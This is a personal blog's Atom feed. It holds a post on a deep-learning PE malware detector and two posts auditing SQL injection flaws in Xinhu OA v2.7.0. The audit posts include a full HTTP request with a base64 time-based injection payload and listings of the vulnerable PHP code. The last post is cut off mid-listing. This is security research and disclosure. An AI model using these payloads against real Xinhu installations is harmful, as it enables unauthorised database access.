<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CHANGMEN&#39;个人博客</title>
  
  
  <link href="https://250wuyifan.github.io/atom.xml" rel="self"/>
  
  <link href="https://250wuyifan.github.io/"/>
  <updated>2025-10-15T14:24:53.670Z</updated>
  <id>https://250wuyifan.github.io/</id>
  
  <author>
    <name>CHANGMEN</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>nature论文汇报</title>
    <link href="https://250wuyifan.github.io/2025/10/15/nature%E8%AE%BA%E6%96%87%E6%B1%87%E6%8A%A5/"/>
    <id>https://250wuyifan.github.io/2025/10/15/nature%E8%AE%BA%E6%96%87%E6%B1%87%E6%8A%A5/</id>
    <published>2025-10-15T14:24:09.000Z</published>
    <updated>2025-10-15T14:24:53.670Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PE恶意代码检测系统-基于深度学习的研究项目"><a href="#PE恶意代码检测系统-基于深度学习的研究项目" class="headerlink" title="PE恶意代码检测系统 - 基于深度学习的研究项目"></a>PE恶意代码检测系统 - 基于深度学习的研究项目</h1><h2 id="项目概述"><a href="#项目概述" class="headerlink" title="项目概述"></a>项目概述</h2><p>本项目是一个基于深度学习的PE（Portable Executable）恶意代码检测系统，旨在通过多种深度学习算法对Windows可执行文件进行恶意性检测。项目采用了全面的实验设计，比较了10种不同的深度学习模型在恶意代码检测任务上的性能表现。</p><h2 id="🎯-研究目标"><a href="#🎯-研究目标" class="headerlink" title="🎯 研究目标"></a>🎯 研究目标</h2><ul><li><strong>主要目标</strong>：构建高效的PE恶意代码检测系统</li><li><strong>技术目标</strong>：比较多种深度学习模型的检测性能</li><li><strong>学术目标</strong>：为恶意代码检测领域提供全面的模型性能基准</li></ul><h2 id="📊-数据集构建"><a href="#📊-数据集构建" class="headerlink" title="📊 数据集构建"></a>📊 数据集构建</h2><h3 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h3><ul><li><strong>恶意样本来源</strong>：MalwareBazaar数据库（abuse.ch）</li><li><strong>时间范围</strong>：2020年2月-6月的恶意样本</li><li><strong>样本数量</strong>：约10,000+恶意样本</li><li><strong>正常样本</strong>：系统PE文件和合法软件</li></ul><h3 id="数据预处理流程"><a href="#数据预处理流程" class="headerlink" title="数据预处理流程"></a>数据预处理流程</h3><ol><li><strong>样本下载与解压</strong>：自动化下载指定日期范围的恶意样本</li><li><strong>PE文件验证</strong>：验证文件格式的有效性</li><li><strong>特征提取</strong>：从PE文件结构中提取58个静态特征</li><li><strong>数据清洗</strong>：处理缺失值和异常值</li></ol><h2 id="🔧-特征工程"><a href="#🔧-特征工程" class="headerlink" title="🔧 特征工程"></a>🔧 特征工程</h2><h3 id="PE文件特征体系"><a href="#PE文件特征体系" class="headerlink" title="PE文件特征体系"></a>PE文件特征体系</h3><p>项目提取了58个PE文件静态特征，涵盖以下几个维度：</p><h4 id="1-DOS头特征（17个）"><a href="#1-DOS头特征（17个）" class="headerlink" title="1. DOS头特征（17个）"></a>1. DOS头特征（17个）</h4><ul><li><code>e_magic</code>：DOS签名</li><li><code>e_cblp</code>：最后一页字节数</li><li><code>e_cp</code>：文件页数</li><li><code>e_lfanew</code>：PE头偏移</li><li>等其他DOS头字段</li></ul><h4 id="2-NT头特征（7个）"><a href="#2-NT头特征（7个）" class="headerlink" title="2. NT头特征（7个）"></a>2. NT头特征（7个）</h4><ul><li><code>machine</code>：目标机器类型</li><li><code>number_of_sections</code>：节区数量</li><li><code>time_date_stamp</code>：时间戳</li><li><code>characteristics</code>：文件特征标志</li><li>等</li></ul><h4 id="3-可选头特征（28个）"><a href="#3-可选头特征（28个）" class="headerlink" title="3. 可选头特征（28个）"></a>3. 可选头特征（28个）</h4><ul><li><code>size_of_code</code>：代码段大小</li><li><code>size_of_image</code>：映像大小</li><li><code>address_of_entry_point</code>：入口点地址</li><li><code>subsystem</code>：子系统类型</li><li>等</li></ul><h4 id="4-节区统计特征（6个）"><a href="#4-节区统计特征（6个）" class="headerlink" title="4. 节区统计特征（6个）"></a>4. 节区统计特征（6个）</h4><ul><li><code>avg_section_entropy</code>：平均节区熵值</li><li><code>max_section_entropy</code>：最大节区熵值</li><li><code>total_virtual_size</code>：总虚拟大小</li><li><code>virtual_raw_ratio</code>：虚拟&#x2F;实际大小比率</li><li>等</li></ul><h3 id="数据预处理策略"><a href="#数据预处理策略" class="headerlink" title="数据预处理策略"></a>数据预处理策略</h3><ul><li><strong>缩放方法</strong>：标准化、最小-最大缩放、无缩放</li><li><strong>特征选择</strong>：PCA降维、LDA降维、无降维</li><li><strong>组合策略</strong>：3×3&#x3D;9种预处理组合</li></ul><h2 id="🤖-深度学习模型架构"><a href="#🤖-深度学习模型架构" class="headerlink" title="🤖 深度学习模型架构"></a>🤖 深度学习模型架构</h2><p>项目实现了10种不同的深度学习模型：</p><h3 id="1-卷积神经网络（CNN）"><a href="#1-卷积神经网络（CNN）" class="headerlink" title="1. 卷积神经网络（CNN）"></a>1. 卷积神经网络（CNN）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- Conv1D(<span class="number">64</span>, <span class="number">3</span>) + BatchNorm + MaxPooling</span><br><span class="line">- Conv1D(<span class="number">32</span>, <span class="number">3</span>) + BatchNorm + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">50</span>) + Dropout(<span class="number">0.5</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="2-长短期记忆网络（LSTM）"><a href="#2-长短期记忆网络（LSTM）" class="headerlink" title="2. 长短期记忆网络（LSTM）"></a>2. 长短期记忆网络（LSTM）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- LSTM(<span class="number">64</span>, return_sequences=<span class="literal">True</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- LSTM(<span class="number">32</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">50</span>) + Dropout(<span class="number">0.5</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="3-循环神经网络（RNN）"><a href="#3-循环神经网络（RNN）" class="headerlink" title="3. 循环神经网络（RNN）"></a>3. 循环神经网络（RNN）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- SimpleRNN(<span class="number">64</span>, return_sequences=<span class="literal">True</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- SimpleRNN(<span class="number">32</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">50</span>) + Dropout(<span class="number">0.5</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="4-多层感知器（MLP）"><a href="#4-多层感知器（MLP）" class="headerlink" title="4. 多层感知器（MLP）"></a>4. 多层感知器（MLP）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- Dense(<span class="number">256</span>) + BatchNorm + Dropout(<span class="number">0.4</span>)</span><br><span class="line">- Dense(<span class="number">128</span>) + BatchNorm + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">64</span>) + Dropout(<span class="number">0.2</span>) + Dense(<span class="number">32</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="5-自组织映射网络（SOM）"><a href="#5-自组织映射网络（SOM）" class="headerlink" title="5. 自组织映射网络（SOM）"></a>5. 自组织映射网络（SOM）</h3><ul><li>自适应网格大小设计</li><li>12×12映射层用于特征可视化</li></ul><h3 id="6-深度信念网络（DBN）"><a href="#6-深度信念网络（DBN）" class="headerlink" title="6. 深度信念网络（DBN）"></a>6. 深度信念网络（DBN）</h3><ul><li>多层sigmoid激活</li><li>逐层预训练架构</li></ul><h3 id="7-受限玻尔兹曼机（RBM）"><a href="#7-受限玻尔兹曼机（RBM）" class="headerlink" title="7. 受限玻尔兹曼机（RBM）"></a>7. 受限玻尔兹曼机（RBM）</h3><ul><li>200→100→50的层次结构</li><li>sigmoid激活函数</li></ul><h3 id="8-自动编码器（AutoEncoder）"><a href="#8-自动编码器（AutoEncoder）" class="headerlink" title="8. 自动编码器（AutoEncoder）"></a>8. 自动编码器（AutoEncoder）</h3><ul><li>编码器：128→64→32</li><li>分类器：16→1</li></ul><h3 id="9-GAN判别器"><a href="#9-GAN判别器" class="headerlink" title="9. GAN判别器"></a>9. GAN判别器</h3><ul><li>256→128→64的判别网络</li><li>适用于对抗性训练</li></ul><h3 id="10-径向基函数网络（RBFN）"><a href="#10-径向基函数网络（RBFN）" class="headerlink" title="10. 径向基函数网络（RBFN）"></a>10. 径向基函数网络（RBFN）</h3><ul><li>100个径向基单元</li><li>高斯核函数</li></ul><h2 id="📈-实验设计与结果"><a href="#📈-实验设计与结果" class="headerlink" title="📈 实验设计与结果"></a>📈 实验设计与结果</h2><h3 id="实验配置"><a href="#实验配置" class="headerlink" title="实验配置"></a>实验配置</h3><ul><li><strong>训练集&#x2F;测试集</strong>：80%&#x2F;20%分割</li><li><strong>交叉验证</strong>：分层K折验证</li><li><strong>优化器</strong>：Adam优化器</li><li><strong>学习率</strong>：0.001（部分模型0.0002）</li><li><strong>批次大小</strong>：32</li><li><strong>早停机制</strong>：patience&#x3D;10</li><li><strong>学习率调度</strong>：ReduceLROnPlateau</li></ul><h3 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h3><ul><li><strong>准确率（Accuracy）</strong></li><li><strong>精确率（Precision）</strong></li><li><strong>召回率（Recall）</strong></li><li><strong>F1分数</strong></li><li><strong>AUC-ROC</strong></li></ul><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>根据实验结果，各模型性能排名如下：</p><table><thead><tr><th>排名</th><th>模型</th><th>准确率</th><th>精确率</th><th>召回率</th><th>F1分数</th><th>AUC</th></tr></thead><tbody><tr><td>1</td><td>CNN</td><td>99.0%</td><td>99.0%</td><td>99.0%</td><td>99.0%</td><td>0.999</td></tr><tr><td>2</td><td>SOM</td><td>98.75%</td><td>98.76%</td><td>98.75%</td><td>98.75%</td><td>0.999</td></tr><tr><td>3</td><td>MLP</td><td>98.5%</td><td>98.5%</td><td>98.5%</td><td>98.5%</td><td>0.998</td></tr><tr><td>4</td><td>RBM</td><td>98.25%</td><td>98.26%</td><td>98.25%</td><td>98.25%</td><td>0.999</td></tr><tr><td>5</td><td>DBN</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>0.999</td></tr><tr><td>6</td><td>GAN判别器</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>0.999</td></tr><tr><td>7</td><td>RNN</td><td>98.0%</td><td>98.02%</td><td>98.0%</td><td>98.0%</td><td>0.999</td></tr><tr><td>8</td><td>AutoEncoder</td><td>97.75%</td><td>97.75%</td><td>97.75%</td><td>97.75%</td><td>0.998</td></tr><tr><td>9</td><td>LSTM</td><td>96.75%</td><td>96.78%</td><td>96.75%</td><td>96.75%</td><td>0.995</td></tr><tr><td>10</td><td>RBFN</td><td>50.0%</td><td>25.0%</td><td>50.0%</td><td>33.33%</td><td>0.5</td></tr></tbody></table><h2 id="🔍-关键发现"><a href="#🔍-关键发现" class="headerlink" title="🔍 关键发现"></a>🔍 关键发现</h2><h3 id="1-模型性能分析"><a href="#1-模型性能分析" class="headerlink" title="1. 模型性能分析"></a>1. 模型性能分析</h3><ul><li><strong>CNN表现最优</strong>：在所有指标上都达到了99%的性能</li><li><strong>传统神经网络效果良好</strong>：SOM、MLP等简单模型也达到了98%+的准确率</li><li><strong>序列模型表现中等</strong>：LSTM、RNN在静态特征上表现不如CNN</li><li><strong>RBFN性能较差</strong>：可能由于径向基函数不适合此类特征</li></ul><h3 id="2-特征工程影响"><a href="#2-特征工程影响" class="headerlink" title="2. 特征工程影响"></a>2. 特征工程影响</h3><ul><li><strong>标准化效果显著</strong>：大多数模型在标准化后性能提升</li><li><strong>PCA降维有效</strong>：在保持性能的同时减少了计算复杂度</li><li><strong>LDA效果有限</strong>：由于是二分类问题，LDA降维效果不明显</li></ul><h3 id="3-技术创新点"><a href="#3-技术创新点" class="headerlink" title="3. 技术创新点"></a>3. 技术创新点</h3><ul><li><strong>全面的模型比较</strong>：首次在PE恶意代码检测中比较10种深度学习模型</li><li><strong>自动化特征提取</strong>：完整的PE文件特征提取pipeline</li><li><strong>多维度评估</strong>：从准确率、效率、鲁棒性多角度评估模型</li></ul><h2 id="🛠-技术架构"><a href="#🛠-技术架构" class="headerlink" title="🛠 技术架构"></a>🛠 技术架构</h2><h3 id="系统组件"><a href="#系统组件" class="headerlink" title="系统组件"></a>系统组件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">恶意代码检测系统</span><br><span class="line">├── 数据采集模块</span><br><span class="line">│   ├── 样本下载器 (指定日期下载文件并解压.py)</span><br><span class="line">│   └── PE文件验证器 (copy.py)</span><br><span class="line">├── 特征提取模块</span><br><span class="line">│   ├── PE解析器 (PEFeatureExtractor)</span><br><span class="line">│   └── 特征工程 (preprocess_data)</span><br><span class="line">├── 模型训练模块</span><br><span class="line">│   ├── 10种深度学习模型</span><br><span class="line">│   └── 超参数优化</span><br><span class="line">├── 评估分析模块</span><br><span class="line">│   ├── 性能指标计算</span><br><span class="line">│   ├── 可视化分析</span><br><span class="line">│   └── 结果导出</span><br><span class="line">└── 工具模块</span><br><span class="line">    ├── 文件统计 (统计目录下pe文件数量.py)</span><br><span class="line">    └── 数据管理</span><br></pre></td></tr></table></figure><h3 id="依赖环境"><a href="#依赖环境" class="headerlink" title="依赖环境"></a>依赖环境</h3><ul><li><strong>Python 3.8+</strong></li><li><strong>TensorFlow 2.x</strong></li><li><strong>scikit-learn</strong></li><li><strong>pandas, numpy</strong></li><li><strong>matplotlib, seaborn</strong></li><li><strong>pefile</strong>（PE文件解析）</li><li><strong>pyzipper</strong>（样本解压）</li></ul><h2 id="📋-项目文件结构"><a href="#📋-项目文件结构" class="headerlink" title="📋 项目文件结构"></a>📋 项目文件结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pythonProject/</span><br><span class="line">├── main.py                          # 主程序（完整的检测系统）</span><br><span class="line">├── nature训练PE检测代码.py            # 优化版检测代码</span><br><span class="line">├── 指定日期下载文件并解压.py          # 样本下载工具</span><br><span class="line">├── copy.py                          # PE文件收集工具</span><br><span class="line">├── 统计目录下pe文件数量.py           # 统计工具</span><br><span class="line">├── pe_malware_results.csv           # 实验结果</span><br><span class="line">├── downloads/                       # 下载的样本压缩包</span><br><span class="line">├── extracted_samples/               # 解压的恶意样本</span><br><span class="line">├── valid_pe_files_bin/             # 有效PE文件（.bin格式）</span><br><span class="line">├── 结果图表/</span><br><span class="line">│   ├── pe_malware_detection_results.png</span><br><span class="line">│   ├── best_models_roc_curves.png</span><br><span class="line">│   └── feature_importance_analysis.png</span><br><span class="line">└── venv/                           # Python虚拟环境</span><br></pre></td></tr></table></figure><h2 id="🎓-学术贡献"><a href="#🎓-学术贡献" class="headerlink" title="🎓 学术贡献"></a>🎓 学术贡献</h2><h3 id="1-理论贡献"><a href="#1-理论贡献" class="headerlink" title="1. 理论贡献"></a>1. 理论贡献</h3><ul><li><strong>模型适用性研究</strong>：系统评估了不同深度学习架构在恶意代码检测中的适用性</li><li><strong>特征重要性分析</strong>：识别了PE文件中对恶意性检测最重要的特征</li><li><strong>预处理策略优化</strong>：确定了最优的数据预处理组合</li></ul><h3 id="2-实践贡献"><a href="#2-实践贡献" class="headerlink" title="2. 实践贡献"></a>2. 实践贡献</h3><ul><li><strong>开源检测系统</strong>：提供了完整的、可复现的恶意代码检测pipeline</li><li><strong>自动化工具链</strong>：从样本收集到结果分析的全自动化流程</li><li><strong>性能基准</strong>：为后续研究提供了标准的性能对比基准</li></ul><h3 id="3-方法创新"><a href="#3-方法创新" class="headerlink" title="3. 方法创新"></a>3. 方法创新</h3><ul><li><strong>多模型集成思路</strong>：为构建更强大的集成检测器奠定基础</li><li><strong>特征工程优化</strong>：提出了PE文件特征提取的最佳实践</li><li><strong>评估框架</strong>：建立了全面的模型评估体系</li></ul><h2 id="🔮-未来工作方向"><a href="#🔮-未来工作方向" class="headerlink" title="🔮 未来工作方向"></a>🔮 未来工作方向</h2><h3 id="1-模型优化"><a href="#1-模型优化" class="headerlink" title="1. 模型优化"></a>1. 模型优化</h3><ul><li><strong>集成学习</strong>：结合多个高性能模型构建集成检测器</li><li><strong>注意力机制</strong>：引入Transformer架构提升特征学习能力</li><li><strong>对抗训练</strong>：增强模型对对抗样本的鲁棒性</li></ul><h3 id="2-特征扩展"><a href="#2-特征扩展" class="headerlink" title="2. 特征扩展"></a>2. 特征扩展</h3><ul><li><strong>动态特征</strong>：结合API调用序列、行为特征</li><li><strong>图结构特征</strong>：利用函数调用图、控制流图</li><li><strong>深度特征</strong>：使用预训练模型提取高级语义特征</li></ul><h3 id="3-实际部署"><a href="#3-实际部署" class="headerlink" title="3. 实际部署"></a>3. 实际部署</h3><ul><li><strong>实时检测</strong>：优化模型推理速度，支持实时检测</li><li><strong>增量学习</strong>：支持新样本的在线学习更新</li><li><strong>边缘计算</strong>：模型压缩与边缘设备部署</li></ul><h2 id="📚-参考文献与相关工作"><a href="#📚-参考文献与相关工作" class="headerlink" title="📚 参考文献与相关工作"></a>📚 参考文献与相关工作</h2><ol><li><strong>PE文件格式分析</strong>：Microsoft PE&#x2F;COFF规范</li><li><strong>恶意代码检测综述</strong>：深度学习在恶意软件检测中的应用</li><li><strong>特征工程方法</strong>：静态分析与动态分析技术对比</li><li><strong>深度学习架构</strong>：CNN、RNN、Transformer在序列分析中的应用</li></ol><h2 id="🏆-项目亮点"><a href="#🏆-项目亮点" class="headerlink" title="🏆 项目亮点"></a>🏆 项目亮点</h2><h3 id="技术亮点"><a href="#技术亮点" class="headerlink" title="技术亮点"></a>技术亮点</h3><ul><li>✅ <strong>全面的模型比较</strong>：10种深度学习模型的系统性评估</li><li>✅ <strong>完整的工程实现</strong>：从数据采集到结果分析的端到端系统</li><li>✅ <strong>高检测精度</strong>：最佳模型达到99%的检测准确率</li><li>✅ <strong>可扩展架构</strong>：模块化设计，易于扩展新模型和特征</li></ul><h3 id="学术价值"><a href="#学术价值" class="headerlink" title="学术价值"></a>学术价值</h3><ul><li>📊 <strong>实证研究</strong>：基于大规模真实数据的实验验证</li><li>🔬 <strong>方法创新</strong>：多维度的模型评估框架</li><li>📈 <strong>性能基准</strong>：为领域研究提供标准对比基准</li><li>🎯 <strong>实用性强</strong>：可直接应用于实际安全防护场景</li></ul><hr><p><strong>项目状态</strong>：✅ 已完成<br><strong>代码开源</strong>：✅ 完整可复现<br><strong>文档完整度</strong>：✅ 详细技术文档<br><strong>适用场景</strong>：🎓 学术研究 | 🏢 工业应用 | 🔒 网络安全</p><hr><p><em>本项目为研究生学位论文的重要组成部分，展示了深度学习在网络安全领域的实际应用价值和学术研究意义。</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PE恶意代码检测系统-基于深度学习的研究项目&quot;&gt;&lt;a href=&quot;#PE恶意代码检测系统-基于深度学习的研究项目&quot; class=&quot;headerlink&quot; title=&quot;PE恶意代码检测系统 - 基于深度学习的研究项目&quot;&gt;&lt;/a&gt;PE恶意代码检测系统 - 基于深度学</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>信呼OA v2.7.0代码审计</title>
    <link href="https://250wuyifan.github.io/2025/10/10/%E4%BF%A1%E5%91%BCOA-v2-7-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://250wuyifan.github.io/2025/10/10/%E4%BF%A1%E5%91%BCOA-v2-7-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2025-10-10T08:49:07.000Z</published>
    <updated>2025-10-10T09:21:16.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="公开漏洞"><a href="#公开漏洞" class="headerlink" title="公开漏洞"></a>公开漏洞</h1><p><a href="https://xz.aliyun.com/news/18609">https://xz.aliyun.com/news/18609</a></p><p><a href="https://xz.aliyun.com/news/18575">https://xz.aliyun.com/news/18575</a></p><p>菜狗大佬公开了三个SQL漏洞</p><h1 id="自行探索"><a href="#自行探索" class="headerlink" title="自行探索"></a>自行探索</h1><p>首先就是他的思想是，找一些解密之后直接拼接数据库的操作，我们首先跟着这个思路来。</p><h2 id="前台SQL注入1"><a href="#前台SQL注入1" class="headerlink" title="前台SQL注入1"></a>前台SQL注入1</h2><p>菜狗大佬只分析了参数“shouji”,可以看到下面也有一个“userid参数”是直接解密然后到下面的getone函数，这里的前提是$barr[‘success’]，也就是$urs     &#x3D; m(‘admin’)-&gt;getone(“<code>mobile</code>&#x3D;’$shouji’ AND <code>status</code>&#x3D;1”);要是正确的手机号。</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010165612920.png" alt="image-20251010165612920"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010165930343.png" alt="image-20251010165930343"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010170148715.png" alt="image-20251010170148715"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010170106620.png" alt="image-20251010170106620"></p><p>不带cookie依旧也是可以，所以是前台注入</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251010170252307.png" alt="image-20251010170252307"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /task.php?m=login|api&amp;a=setwxqy&amp;d=task&amp;shouji=MTU4MDAwMDAwMjM=&amp;userid=MSdhbmQgc2xlZXAoMyktLSA=&amp;num=test&amp;agentid=1&amp;callback=test&quot; HTTP/1.1</span><br><span class="line">Host: 192.168.31.23:85</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,zh-TW;q=0.5</span><br><span class="line">Cookie: Hm_lvt_1040d081eea13b44d84a4af639640d51=1759770582; HMACCOUNT=4160D16E28E71D0D; session_user=wgPmpe3hEuJWIL+I+kHtxqag1wutWsMhm6eaAgoJH0c=; Hm_lpvt_1040d081eea13b44d84a4af639640d51=1760018993; PHPSESSID=ulo3i8uqc6539kccfednk4bhcd; deviceid=1760022055661; xinhu_mo_adminid=jy0los0uo0llv0uu0zo0loo0llj0loo0ju0zt0lov0uu0ju0ut0zj05; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;公开漏洞&quot;&gt;&lt;a href=&quot;#公开漏洞&quot; class=&quot;headerlink&quot; title=&quot;公开漏洞&quot;&gt;&lt;/a&gt;公开漏洞&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/news/18609&quot;&gt;https://xz.aliyun.c</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://250wuyifan.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>复习SQL注入</title>
    <link href="https://250wuyifan.github.io/2025/10/08/%E5%A4%8D%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://250wuyifan.github.io/2025/10/08/%E5%A4%8D%E4%B9%A0SQL%E6%B3%A8%E5%85%A5/</id>
    <published>2025-10-07T17:07:50.000Z</published>
    <updated>2025-10-10T09:03:20.216Z</updated>
    
    <content type="html"><![CDATA[<h1 id="【最终完整版】信呼OA-v2-7-0-解密SQL注入漏洞审计报告"><a href="#【最终完整版】信呼OA-v2-7-0-解密SQL注入漏洞审计报告" class="headerlink" title="【最终完整版】信呼OA v2.7.0 - 解密SQL注入漏洞审计报告"></a>【最终完整版】信呼OA v2.7.0 - 解密SQL注入漏洞审计报告</h1><h2 id="📋-执行摘要"><a href="#📋-执行摘要" class="headerlink" title="📋 执行摘要"></a>📋 执行摘要</h2><p><strong>按照规律系统性搜索：<code>base64decode/uncrypt</code> → 无过滤 → 直接SQL拼接</strong></p><p>发现 <strong>15个真正的解密参数SQL注入漏洞</strong>！</p><hr><h2 id="🎯-核心漏洞规律"><a href="#🎯-核心漏洞规律" class="headerlink" title="🎯 核心漏洞规律"></a>🎯 核心漏洞规律</h2><p>你教会我的规律：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参数 → decode/uncrypt → ❌(无iconvsql/filterstr/xssrepstr) → SQL拼接</span><br></pre></td></tr></table></figure><hr><h2 id="🔥-完整漏洞列表（15个）"><a href="#🔥-完整漏洞列表（15个）" class="headerlink" title="🔥 完整漏洞列表（15个）"></a>🔥 完整漏洞列表（15个）</h2><h3 id="【1】inputAction-php-getselectdataAjax-万能SQL注入-⭐⭐⭐⭐⭐⭐"><a href="#【1】inputAction-php-getselectdataAjax-万能SQL注入-⭐⭐⭐⭐⭐⭐" class="headerlink" title="【1】inputAction.php - getselectdataAjax() - 万能SQL注入 ⭐⭐⭐⭐⭐⭐"></a>【1】inputAction.php - getselectdataAjax() - 万能SQL注入 ⭐⭐⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/flow/input/inputAction.php:782</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getselectdataAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$actstr</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;actstr&#x27;</span>));  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">    <span class="variable">$acta</span>   = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$actstr</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">isempt</span>(<span class="variable">$act</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$actstr</span>)&#123;</span><br><span class="line">            <span class="variable">$rows</span> = <span class="title function_ invoke__">c</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">sqlstore</span>(<span class="variable">$actstr</span>);  <span class="comment">// ⚠️ 无过滤，直接传入</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$rows</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sqlstore代码</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inputChajian.php:399</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqlstore</span>(<span class="params"><span class="variable">$actstr1</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$acta</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$actstr1</span>);</span><br><span class="line">    <span 